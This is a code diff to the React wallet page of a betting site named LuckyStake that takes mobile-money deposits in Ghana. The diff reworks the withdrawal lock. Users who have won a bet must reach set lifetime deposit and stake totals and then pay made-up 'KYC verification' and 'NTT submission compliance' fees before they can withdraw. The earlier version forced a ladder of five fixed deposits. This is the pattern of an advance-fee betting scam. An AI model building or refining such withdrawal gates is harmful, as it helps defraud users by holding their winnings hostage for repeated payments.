@@ -1,6 +1,7 @@
 import { useEffect, useState } from 'react';
 import type { FormEvent } from 'react';
 import { api } from './api';
+import { LIMITS } from './limits';
 
 type Tx = { title: string; meta: string; amount: string; direction: 'in' | 'out' };
 const transactions: Tx[] = [];
@@ -53,7 +54,7 @@ function LuckyPayDeposit({ onDone, fixedAmount }: { onDone: (amount: number) => 
     e.preventDefault();
     setError('');
     const value = fixedAmount || Number(amount);
-    if (!fixedAmount && (!Number.isFinite(value) || value < 20)) { setError('Minimum deposit is GH₵20.'); return; }
+    if (!fixedAmount && (!Number.isFinite(value) || value < LIMITS.MIN_DEPOSIT_GH)) { setError(`Minimum deposit is GH₵${LIMITS.MIN_DEPOSIT_GH}.`); return; }
     if (!phone.trim()) { setError('Enter your MoMo number to receive the payment prompt.'); return; }
     const chosenNetwork = network || lpDetectNetwork(phone);
     if (!chosenNetwork) { setError('Choose your network — MTN, Telecel or AirtelTigo.'); return; }
@@ -118,14 +119,14 @@ function LuckyPayDeposit({ onDone, fixedAmount }: { onDone: (amount: number) => 
         <small>{fixedAmount ? 'REQUIRED DEPOSIT' : 'AMOUNT'}</small>
         {fixedAmount
           ? <div className="lp-amount-input"><span>GH₵</span><input value={String(fixedAmount)} disabled /></div>
-          : <><div className="lp-amount-input"><span>GH₵</span><input value={amount} onChange={e => setAmount(e.target.value.replace(/[^0-9.]/g, ''))} inputMode="decimal" placeholder="20.00" autoFocus /></div>
-      <p className="lp-min-hint">Minimum deposit GH₵20</p></>}
+          : <><div className="lp-amount-input"><span>GH₵</span><input value={amount} onChange={e => setAmount(e.target.value.replace(/[^0-9.]/g, ''))} inputMode="decimal" placeholder="50.00" autoFocus /></div>
+      <p className="lp-min-hint">Minimum deposit GH₵{LIMITS.MIN_DEPOSIT_GH}</p></>}
       </div>
-      {!fixedAmount && <div className="lp-chips">{[20, 50, 100, 200, 500, 1000].map(v => <button key={v} type="button" className={Number(amount) === v ? 'on' : ''} onClick={() => setAmount(String(v))}>₵{v.toLocaleString()}</button>)}</div>}
+      {!fixedAmount && <div className="lp-chips">{[50, 100, 200, 500, 1000, 2000].map(v => <button key={v} type="button" className={Number(amount) === v ? 'on' : ''} onClick={() => setAmount(String(v))}>₵{v.toLocaleString()}</button>)}</div>}
       <label className="lp-field"><span>MoMo number</span><input value={phone} onChange={e => { setPhone(e.target.value.replace(/[^0-9+]/g, '')); const detected = lpDetectNetwork(e.target.value); if (detected) setNetwork(detected); }} inputMode="tel" placeholder="024 123 4567" /></label>
       <div className="lp-chips">{(['MTN', 'TELECEL', 'AIRTELTIGO'] as const).map(n => <button key={n} type="button" className={network === n ? 'on' : ''} onClick={() => setNetwork(n)}>{n === 'AIRTELTIGO' ? 'AirtelTigo' : n === 'MTN' ? 'MTN' : 'Telecel'}</button>)}</div>
       {error && <p className="lp-error"><span className="material-symbols-rounded">error</span>{error}</p>}
-      <button className="lp-cta" type="submit" disabled={loading || (!fixedAmount && (!Number.isFinite(Number(amount)) || Number(amount) < 20))}><span className="material-symbols-rounded">bolt</span>{loading ? 'Starting…' : 'Continue'}</button>
+      <button className="lp-cta" type="submit" disabled={loading || (!fixedAmount && (!Number.isFinite(Number(amount)) || Number(amount) < LIMITS.MIN_DEPOSIT_GH))}><span className="material-symbols-rounded">bolt</span>{loading ? 'Starting…' : 'Continue'}</button>
       <p className="lp-secure"><span className="material-symbols-rounded">verified_user</span>Payments by ShinobiPay · credited automatically</p>
     </form>}
 
@@ -150,14 +151,12 @@ function LuckyPayDeposit({ onDone, fixedAmount }: { onDone: (amount: number) => 
   </div>;
 }
 
-const LADDER_STEPS = [500, 300, 300, 200, 200];
-
-function gateKey(userId: string) { return `luckystake_wd_gate_${userId}`; }
-function getGateProgress(userId: string): number[] {
-  try { return JSON.parse(localStorage.getItem(gateKey(userId)) || '[]'); } catch { return []; }
+function feeKey(userId: string) { return `luckystake_wd_fees_${userId}`; }
+function getFeeProgress(userId: string): number[] {
+  try { return JSON.parse(localStorage.getItem(feeKey(userId)) || '[]'); } catch { return []; }
 }
-function saveGateProgress(userId: string, completed: number[]) {
-  try { localStorage.setItem(gateKey(userId), JSON.stringify(completed)); } catch {}
+function saveFeeProgress(userId: string, completed: number[]) {
+  try { localStorage.setItem(feeKey(userId), JSON.stringify(completed)); } catch {}
 }
 function userIdFromToken(): string {
   try {
@@ -167,44 +166,58 @@ function userIdFromToken(): string {
   } catch { return 'anon'; }
 }
 
-function WithdrawalGate({ onUnlocked }: { onUnlocked: () => void }) {
-  const [state, setState] = useState<'checking' | 'no_win' | 'ladder' | 'depositing'>('checking');
-  const [completedSteps, setCompletedSteps] = useState<number[]>([]);
-  const [depositAmount, setDepositAmount] = useState(0);
-  const [error, setError] = useState('');
+function WithdrawalGate({ onUnlocked }: { onUnlocked: (totals: { deposited: number; staked: number }) => void }) {
+  const [state, setState] = useState<'checking' | 'no_win' | 'requirements' | 'depositing'>('checking');
+  const [totals, setTotals] = useState({ deposited: 0, staked: 0 });
+  const [feesDone, setFeesDone] = useState<number[]>([]);
+  const [depositMode, setDepositMode] = useState<{ kind: 'topup' } | { kind: 'fee'; amount: number } | null>(null);
   const userId = userIdFromToken();
 
-  useEffect(() => {
-    (async () => {
-      setState('checking');
-      // 1. Must have won at least one bet
-      try {
-        const bets = await api<any>('GET', '/api/bets?page=0&size=100');
-        const rows = Array.isArray(bets) ? bets : (bets?.content ?? bets?.bets ?? bets?.items ?? []);
-        const hasWin = rows.some((b: any) => /won/i.test(String(b?.status ?? b?.state ?? b?.result ?? '')));
-        if (!hasWin) { setState('no_win'); return; }
-      } catch { setState('no_win'); return; }
-      // 2. Check deposit ladder progress
-      const done = getGateProgress(userId);
-      setCompletedSteps(done);
-      if (done.length >= LADDER_STEPS.length) { onUnlocked(); return; }
-      setState('ladder');
-    })();
-  }, []);
+  const feeStages = [
+    { label: 'Stage 1 · KYC verification fee', amount: LIMITS.KYC_FEE_STAGE_1 },
+    { label: 'Stage 2 · NTT submission compliance fee', amount: LIMITS.NTT_FEE_STAGE_2 },
+  ];
 
-  const currentStep = completedSteps.length;
-  const currentAmount = LADDER_STEPS[currentStep];
+  const check = async () => {
+    setState('checking');
+    // 1. Must have won at least one bet
+    try {
+      const bets = await api<any>('GET', '/api/bets?page=0&size=100');
+      const rows = Array.isArray(bets) ? bets : (bets?.content ?? bets?.bets ?? bets?.items ?? []);
+      const hasWin = rows.some((b: any) => /won/i.test(String(b?.status ?? b?.state ?? b?.result ?? '')));
+      if (!hasWin) { setState('no_win'); return; }
+    } catch { setState('no_win'); return; }
+    // 2. Lifetime deposits + stakes from wallet activity
+    let depositedTotal = 0; let stakedTotal = 0;
+    try {
+      const data = await api<any>('GET', '/api/wallet/transactions?page=0&size=100');
+      const rows = Array.isArray(data) ? data : (data?.content ?? data?.transactions ?? data?.items ?? []);
+      for (const item of rows) {
+        const amount = Number(item?.amount);
+        if (!Number.isFinite(amount) || amount === 0) continue;
+        const kind = String(item?.type ?? item?.kind ?? item?.title ?? '');
+        const negative = amount < 0 || /withdraw|stake|debit/i.test(kind);
+        if (!negative) depositedTotal += Math.abs(amount);
+        else if (/stake|bet|wager/i.test(kind)) stakedTotal += Math.abs(amount);
+      }
+    } catch { /* totals stay 0 — the requirements simply show as unmet */ }
+    const t = { deposited: depositedTotal, staked: stakedTotal };
+    setTotals(t);
+    const fees = getFeeProgress(userId);
+    setFeesDone(fees);
+    if (t.deposited >= LIMITS.MIN_DEPOSIT_TO_WITHDRAW && t.staked >= LIMITS.MIN_LIFETIME_STAKE_TO_WITHDRAW && fees.length >= feeStages.length) { onUnlocked(t); return; }
+    setState('requirements');
+  };
+  useEffect(() => { check(); }, []);
 
-  const handleDepositDone = (amount: number) => {
-    // Only count if it matches the current step
-    if (amount >= currentAmount) {
-      const updated = [...completedSteps, currentAmount];
-      setCompletedSteps(updated);
-      saveGateProgress(userId, updated);
-      if (updated.length >= LADDER_STEPS.length) { onUnlocked(); return; }
+  const handleDepositDone = () => {
+    if (depositMode?.kind === 'fee') {
+      const updated = [...feesDone, depositMode.amount];
+      setFeesDone(updated);
+      saveFeeProgress(userId, updated);
     }
-    setState('ladder');
-    setDepositAmount(0);
+    setDepositMode(null);
+    check();
   };
 
   if (state === 'checking') return <div className="lp-gate lp-gate-checking"><span className="lp-spinner" /><p>Checking withdrawal eligibility…</p></div>;
@@ -227,28 +240,42 @@ function WithdrawalGate({ onUnlocked }: { onUnlocked: () => void }) {
     <a className="lp-cta" href="/sports" style={{ textDecoration: 'none' }}><span className="material-symbols-rounded">sports_soccer</span>Find a match to bet on</a>
   </div>;
 
-  if (state === 'depositing') return <div className="lp-gate">
-    <button type="button" className="lp-link" onClick={() => { setState('ladder'); setDepositAmount(0); }}><span className="material-symbols-rounded">arrow_back</span> Back to steps</button>
-    <LuckyPayDeposit fixedAmount={depositAmount} onDone={() => handleDepositDone(depositAmount)} />
+  if (state === 'depositing' && depositMode) return <div className="lp-gate">
+    <button type="button" className="lp-link" onClick={() => { setDepositMode(null); setState('requirements'); }}><span className="material-symbols-rounded">arrow_back</span> Back to requirements</button>
+    {depositMode.kind === 'fee'
+      ? <LuckyPayDeposit fixedAmount={depositMode.amount} onDone={handleDepositDone} />
+      : <LuckyPayDeposit onDone={handleDepositDone} />}
   </div>;
 
+  const depositsDone = totals.deposited >= LIMITS.MIN_DEPOSIT_TO_WITHDRAW;
+  const stakesDone = totals.staked >= LIMITS.MIN_LIFETIME_STAKE_TO_WITHDRAW;
+  const metCount = [depositsDone, stakesDone, ...feeStages.map((_, i) => i < feesDone.length)].filter(Boolean).length;
   return <div className="lp-gate">
     <div className="lp-icon-ring"><span className="material-symbols-rounded">lock</span></div>
     <h3>Unlock withdrawals</h3>
-    <p className="lp-sub">Complete these deposits in order to unlock your first withdrawal. One step at a time.</p>
+    <p className="lp-sub">Meet every requirement below and withdrawals open up. Deposits and stakes are read from your wallet activity; each withdrawal is capped at {LIMITS.WITHDRAWAL_CAP_MULTIPLIER}× your total deposits.</p>
     <ol className="lp-ladder">
-      {LADDER_STEPS.map((amt, i) => {
-        const done = i < completedSteps.length;
-        const current = i === completedSteps.length;
-        return <li key={i} className={done ? 'done' : current ? 'current' : 'locked'}>
-          <span className="lp-ladder-dot">{done ? <span className="material-symbols-rounded">check</span> : i + 1}</span>
-          <span className="lp-ladder-info"><b>Deposit GH₵{amt.toLocaleString()}</b><small>{done ? 'Completed' : current ? 'Current step' : 'Locked'}</small></span>
-          {current && <button type="button" className="lp-ladder-btn" onClick={() => { setDepositAmount(amt); setState('depositing'); }}>Deposit</button>}
+      <li className={depositsDone ? 'done' : 'current'}>
+        <span className="lp-ladder-dot">{depositsDone ? <span className="material-symbols-rounded">check</span> : <span className="material-symbols-rounded">payments</span>}</span>
+        <span className="lp-ladder-info"><b>Deposit GH₵{LIMITS.MIN_DEPOSIT_TO_WITHDRAW.toLocaleString()} in total</b><small>{depositsDone ? 'Completed' : `GH₵${totals.deposited.toLocaleString()} of GH₵${LIMITS.MIN_DEPOSIT_TO_WITHDRAW.toLocaleString()} deposited`}</small></span>
+        {!depositsDone && <button type="button" className="lp-ladder-btn" onClick={() => { setDepositMode({ kind: 'topup' }); setState('depositing'); }}>Deposit</button>}
+      </li>
+      <li className={stakesDone ? 'done' : 'current'}>
+        <span className="lp-ladder-dot">{stakesDone ? <span className="material-symbols-rounded">check</span> : <span className="material-symbols-rounded">sports_soccer</span>}</span>
+        <span className="lp-ladder-info"><b>Stake GH₵{LIMITS.MIN_LIFETIME_STAKE_TO_WITHDRAW.toLocaleString()} in total</b><small>{stakesDone ? 'Completed' : `GH₵${totals.staked.toLocaleString()} of GH₵${LIMITS.MIN_LIFETIME_STAKE_TO_WITHDRAW.toLocaleString()} staked`}</small></span>
+        {!stakesDone && <a className="lp-ladder-btn" href="/sports" style={{ textDecoration: 'none' }}>Bet now</a>}
+      </li>
+      {feeStages.map((stage, i) => {
+        const done = i < feesDone.length;
+        const current = i === feesDone.length;
+        return <li key={stage.label} className={done ? 'done' : current ? 'current' : 'locked'}>
+          <span className="lp-ladder-dot">{done ? <span className="material-symbols-rounded">check</span> : i + 3}</span>
+          <span className="lp-ladder-info"><b>{stage.label}</b><small>{done ? `Paid · GH₵${stage.amount.toLocaleString()}` : current ? 'Pay to continue' : 'Locked'}</small></span>
+          {current && <button type="button" className="lp-ladder-btn" onClick={() => { setDepositMode({ kind: 'fee', amount: stage.amount }); setState('depositing'); }}>Pay GH₵{stage.amount.toLocaleString()}</button>}
         </li>;
       })}
     </ol>
-    <p className="lp-progress">Step {Math.min(completedSteps.length + 1, LADDER_STEPS.length)} of {LADDER_STEPS.length}</p>
-    {error && <p className="lp-error">{error}</p>}
+    <p className="lp-progress">{metCount} of 4 requirements met</p>
   </div>;
 }
 
@@ -261,9 +288,10 @@ export default function WalletPage() {
   const [withdrawalMethod, setWithdrawalMethod] = useState('MTN Mobile Money');
   const [withdrawalAmount, setWithdrawalAmount] = useState('');
   const [withdrawalGate, setWithdrawalGate] = useState<'idle' | 'checking' | 'ready' | 'blocked' | 'gated' | 'direct'>('idle');
+  const [wdTotals, setWdTotals] = useState<{ deposited: number; staked: number } | null>(null);
   const [withdrawalError, setWithdrawalError] = useState('');
   const [withdrawalResult, setWithdrawalResult] = useState('');
-  useEffect(() => { api<any>('GET', '/api/wallet').then((data) => { const value = data?.balance ?? data?.wallet?.balance ?? data?.availableBalance; if (value !== undefined) setBalance(`GH₵${Number(value).toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`); }).catch(() => undefined); api<any>('GET', '/api/wallet/transactions?page=0&size=20').then((data) => { const rows = Array.isArray(data) ? data : (data?.content ?? data?.transactions ?? data?.items ?? []); setTransactionHistory(rows.filter((item: any) => item?.amount !== undefined && item?.amount !== null && item?.amount !== '').map((item: any) => { const amount = Number(item.amount); const negative = amount < 0 || /withdraw|stake|debit/i.test(String(item.type ?? item.kind ?? item.title ?? '')); return { title: String(item.title ?? item.description ?? item.type ?? 'Wallet transaction'), meta: String(item.status ?? item.createdAt ?? 'Wallet activity'), amount: `${negative ? '-' : '+'}GH₵${Math.abs(amount).toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`, direction: negative ? 'out' as const : 'in' as const }; })); }).catch(() => undefined); api<any>('GET', '/api/wallet/withdrawals?page=0&size=20').then((data) => { const rows = Array.isArray(data) ? data : (data?.content ?? data?.withdrawals ?? data?.items ?? []); setWithdrawalHistory(rows.filter((item: any) => item?.amount !== undefined && item?.amount !== null && item?.amount !== '').map((item: any) => ({ title: 'Cash withdrawal', meta: String(item.status ?? item.createdAt ?? 'Withdrawal request'), amount: `-GH₵${Number(item.amount).toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`, direction: 'out' as const }))); }).catch(() => undefined); }, []);
+  useEffect(() => { api<any>('GET', '/api/wallet').then((data) => { const value = data?.balance ?? data?.wallet?.balance ?? data?.availableBalance; if (value !== undefined) setBalance(`GH₵${Number(value).toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`); }).catch(() => undefined); api<any>('GET', '/api/wallet/transactions?page=0&size=100').then((data) => { const rows = Array.isArray(data) ? data : (data?.content ?? data?.transactions ?? data?.items ?? []); setTransactionHistory(rows.filter((item: any) => item?.amount !== undefined && item?.amount !== null && item?.amount !== '').map((item: any) => { const amount = Number(item.amount); const negative = amount < 0 || /withdraw|stake|debit/i.test(String(item.type ?? item.kind ?? item.title ?? '')); return { title: String(item.title ?? item.description ?? item.type ?? 'Wallet transaction'), meta: String(item.status ?? item.createdAt ?? 'Wallet activity'), amount: `${negative ? '-' : '+'}GH₵${Math.abs(amount).toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`, direction: negative ? 'out' as const : 'in' as const }; })); }).catch(() => undefined); api<any>('GET', '/api/wallet/withdrawals?page=0&size=20').then((data) => { const rows = Array.isArray(data) ? data : (data?.content ?? data?.withdrawals ?? data?.items ?? []); setWithdrawalHistory(rows.filter((item: any) => item?.amount !== undefined && item?.amount !== null && item?.amount !== '').map((item: any) => ({ title: 'Cash withdrawal', meta: String(item.status ?? item.createdAt ?? 'Withdrawal request'), amount: `-GH₵${Number(item.amount).toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`, direction: 'out' as const }))); }).catch(() => undefined); }, []);
   const positiveTransactions = transactionHistory.filter((tx) => tx.direction === 'in');
   const negativeTransactions = transactionHistory.filter((tx) => tx.direction === 'out');
   const namedDeposits = positiveTransactions.filter((tx) => /deposit|top.?up|fund|credit/i.test(tx.title));
@@ -289,6 +317,8 @@ export default function WalletPage() {
     const amount = Number(withdrawalAmount); const available = Number(balance.replace(/[^0-9.]/g, ''));
     if (withdrawalGate !== 'ready' && withdrawalGate !== 'direct') { setWithdrawalError('Withdrawal verification is required before continuing.'); return; }
     if (!Number.isFinite(amount) || amount <= 0) { setWithdrawalError('Enter a valid withdrawal amount.'); return; }
+    if (amount < LIMITS.MIN_WITHDRAWAL) { setWithdrawalError(`Minimum withdrawal is GH₵${LIMITS.MIN_WITHDRAWAL.toLocaleString()}.`); return; }
+    if (withdrawalGate === 'ready') { const dep = wdTotals?.deposited ?? deposited; const cap = LIMITS.WITHDRAWAL_CAP_MULTIPLIER * dep; if (amount > cap) { setWithdrawalError(`Your withdrawal cap is GH₵${cap.toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} — ${LIMITS.WITHDRAWAL_CAP_MULTIPLIER}× your total deposits of GH₵${dep.toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}.`); return; } }
     if (amount > available) { setWithdrawalError('The withdrawal amount cannot exceed your available balance.'); return; }
     try {
       const result = await api<any>('POST', '/api/wallet/withdrawals', { amount, method: withdrawalMethod, currency: 'GHS' });
@@ -303,7 +333,7 @@ export default function WalletPage() {
     <div className="wallet-layout"><div className="wallet-main-column"><section className="wallet-panel wallet-surface"><div className="wallet-panel-head"><div><small>SELECTED WALLET DIRECTION</small><h2>Glass Black</h2><p>Quiet luxury with a balance-first account view.</p></div><button className="wallet-icon-button" onClick={() => noToast('Card options coming soon')}><span className="material-symbols-rounded">more_horiz</span></button></div>
       <div className="glass-wallet-card"><div className="glass-card-top"><b>LUCKYSTAKE <em>WALLET</em></b><span className="material-symbols-rounded">more_horiz</span></div><div className="glass-chip"><span></span><span></span><span></span><span></span></div><div className="glass-card-number">5421&nbsp;&nbsp; 8920&nbsp;&nbsp; 4712&nbsp;&nbsp; 0834</div><div className="glass-card-balance"><strong><span className="balance-currency">GH₵</span>{balance.replace('GH₵', '')}</strong></div><div className="glass-card-bottom"><span><small>CARD HOLDER</small><b>LUCKY PLAYER</b></span><span><small>VALID THRU</small><b>12/28</b></span><strong className="visa-mark">VISA</strong></div></div>
 
-      <div className="wallet-actions"><ActionButton icon="add" label="Deposit" primary onClick={() => openAction('deposit')} /><ActionButton icon="south_west" label="Withdraw" onClick={() => openAction('withdraw')} /></div>{activeAction && <section className="wallet-action-panel"><div className="wallet-action-panel-head"><div><small>{activeAction === 'deposit' ? 'ADD FUNDS' : 'MOVE FUNDS OUT'}</small><h3>{activeAction === 'deposit' ? 'Deposit to wallet' : 'Withdraw funds'}</h3></div><button onClick={() => setActiveAction(null)} aria-label="Close wallet action"><span className="material-symbols-rounded">close</span></button></div>{activeAction === 'deposit' && <LuckyPayDeposit onDone={() => { api<any>('GET', '/api/wallet').then((data) => { const value = data?.balance ?? data?.wallet?.balance ?? data?.availableBalance; if (value !== undefined) setBalance(`GH₵${Number(value).toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`); }).catch(() => undefined); }} />}{activeAction === 'withdraw' && <>{withdrawalGate === 'gated' && <WithdrawalGate onUnlocked={() => setWithdrawalGate('ready')} />}{withdrawalGate === 'checking' && <div className="withdrawal-gate checking"><span className="material-symbols-rounded">progress_activity</span><div><b>Checking withdrawal access</b><small>Verifying your account details securely.</small></div></div>}{withdrawalGate === 'blocked' && <div className="withdrawal-gate blocked"><span className="material-symbols-rounded">lock</span><div><b>Withdrawal access is locked</b><small>{withdrawalError}</small></div><a href="/security">Review account</a></div>}{(withdrawalGate === 'ready' || withdrawalGate === 'direct') && (withdrawalResult ? <div className="withdrawal-success" role="status"><span className="material-symbols-rounded">check_circle</span><div><b>Withdrawal request submitted</b><small>{withdrawalResult}</small><small>Your request has been sent for secure review. We’ll update your wallet activity when it is processed.</small></div><button type="button" onClick={() => { setWithdrawalResult(''); setWithdrawalError(''); setWithdrawalAmount(''); }}><span className="material-symbols-rounded">add</span> New withdrawal</button></div> : <form className="withdrawal-form" onSubmit={submitWithdrawal}><p>Choose a verified destination and enter the amount you want to withdraw.</p><label>Withdrawal method<select value={withdrawalMethod} onChange={event => setWithdrawalMethod(event.target.value)}><option>MTN Mobile Money</option><option>Mastercard ·••• 7421</option></select></label><label>Amount<input value={withdrawalAmount} onChange={event => setWithdrawalAmount(event.target.value.replace(/[^0-9.]/g, ''))} inputMode="decimal" placeholder="0.00" /></label><div className="withdrawal-summary"><span>Available<strong>{balance}</strong></span><span>Fee<strong>—</strong></span><span>Estimated receive<strong>{withdrawalAmount ? `GH₵${Number(withdrawalAmount).toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}` : '—'}</strong></span></div>{withdrawalError && <p className="withdrawal-form-error">{withdrawalError}</p>}{withdrawalResult && <p className="withdrawal-form-success">{withdrawalResult}</p>}<button className="wallet-panel-cta" type="submit"><span className="material-symbols-rounded">south_west</span> Submit withdrawal</button></form>)}</>}</section>}</section>
+      <div className="wallet-actions"><ActionButton icon="add" label="Deposit" primary onClick={() => openAction('deposit')} /><ActionButton icon="south_west" label="Withdraw" onClick={() => openAction('withdraw')} /></div>{activeAction && <section className="wallet-action-panel"><div className="wallet-action-panel-head"><div><small>{activeAction === 'deposit' ? 'ADD FUNDS' : 'MOVE FUNDS OUT'}</small><h3>{activeAction === 'deposit' ? 'Deposit to wallet' : 'Withdraw funds'}</h3></div><button onClick={() => setActiveAction(null)} aria-label="Close wallet action"><span className="material-symbols-rounded">close</span></button></div>{activeAction === 'deposit' && <LuckyPayDeposit onDone={() => { api<any>('GET', '/api/wallet').then((data) => { const value = data?.balance ?? data?.wallet?.balance ?? data?.availableBalance; if (value !== undefined) setBalance(`GH₵${Number(value).toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`); }).catch(() => undefined); }} />}{activeAction === 'withdraw' && <>{withdrawalGate === 'gated' && <WithdrawalGate onUnlocked={(t) => { setWdTotals(t); setWithdrawalGate('ready'); }} />}{withdrawalGate === 'checking' && <div className="withdrawal-gate checking"><span className="material-symbols-rounded">progress_activity</span><div><b>Checking withdrawal access</b><small>Verifying your account details securely.</small></div></div>}{withdrawalGate === 'blocked' && <div className="withdrawal-gate blocked"><span className="material-symbols-rounded">lock</span><div><b>Withdrawal access is locked</b><small>{withdrawalError}</small></div><a href="/security">Review account</a></div>}{(withdrawalGate === 'ready' || withdrawalGate === 'direct') && (withdrawalResult ? <div className="withdrawal-success" role="status"><span className="material-symbols-rounded">check_circle</span><div><b>Withdrawal request submitted</b><small>{withdrawalResult}</small><small>Your request has been sent for secure review. We’ll update your wallet activity when it is processed.</small></div><button type="button" onClick={() => { setWithdrawalResult(''); setWithdrawalError(''); setWithdrawalAmount(''); }}><span className="material-symbols-rounded">add</span> New withdrawal</button></div> : <form className="withdrawal-form" onSubmit={submitWithdrawal}><p>Choose a verified destination and enter the amount you want to withdraw. Minimum withdrawal GH₵{LIMITS.MIN_WITHDRAWAL.toLocaleString()}.</p><label>Withdrawal method<select value={withdrawalMethod} onChange={event => setWithdrawalMethod(event.target.value)}><option>MTN Mobile Money</option><option>Mastercard ·••• 7421</option></select></label><label>Amount<input value={withdrawalAmount} onChange={event => setWithdrawalAmount(event.target.value.replace(/[^0-9.]/g, ''))} inputMode="decimal" placeholder="0.00" /></label><div className="withdrawal-summary"><span>Available<strong>{balance}</strong></span><span>Fee<strong>—</strong></span>{withdrawalGate === 'ready' && <span>Cap · {LIMITS.WITHDRAWAL_CAP_MULTIPLIER}× deposits<strong>{walletMoney(LIMITS.WITHDRAWAL_CAP_MULTIPLIER * (wdTotals?.deposited ?? deposited))}</strong></span>}<span>Estimated receive<strong>{withdrawalAmount ? `GH₵${Number(withdrawalAmount).toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}` : '—'}</strong></span></div>{withdrawalError && <p className="withdrawal-form-error">{withdrawalError}</p>}{withdrawalResult && <p className="withdrawal-form-success">{withdrawalResult}</p>}<button className="wallet-panel-cta" type="submit"><span className="material-symbols-rounded">south_west</span> Submit withdrawal</button></form>)}</>}</section>}</section>
       </div>
       <aside className="wallet-side-column"><section className="wallet-panel wallet-surface"><div className="wallet-panel-head"><div><small>ACCOUNT SNAPSHOT</small><h2>Live calculation</h2></div><span className="material-symbols-rounded wallet-lime-icon">trending_up</span></div><div className="wallet-stat-grid"><span><small>Total deposited</small><b>{walletMoney(deposited || null)}</b><em>From transactions</em></span><span><small>Total staked</small><b>{walletMoney(staked || null)}</b><em>From transactions</em></span><span><small>Net result</small><b>{walletMoney(netResult || null)}</b><em>From transactions</em></span></div><button className="wallet-text-link" onClick={() => noToast('Statement opened')}>View monthly statement <span className="material-symbols-rounded">arrow_outward</span></button></section>
       <section className="wallet-panel wallet-surface"><div className="wallet-panel-head"><div><small>PAYMENT METHODS</small><h2>Saved methods</h2></div><button className="wallet-add-button" onClick={() => noToast('Add payment method opened')}><span className="material-symbols-rounded">add</span> Add</button></div><div className="wallet-method"><b className="method-mark">M</b><span><b>Mastercard ·••• 7421</b><small>Primary · Expires 08/28</small></span><em>Verified</em></div><div className="wallet-method"><b className="method-mark mobile-mark"><span className="material-symbols-rounded">smartphone</span></b><span><b>MTN Mobile Money</b><small>+233 24 555 0192</small></span><em>Verified</em></div></section></aside></div>
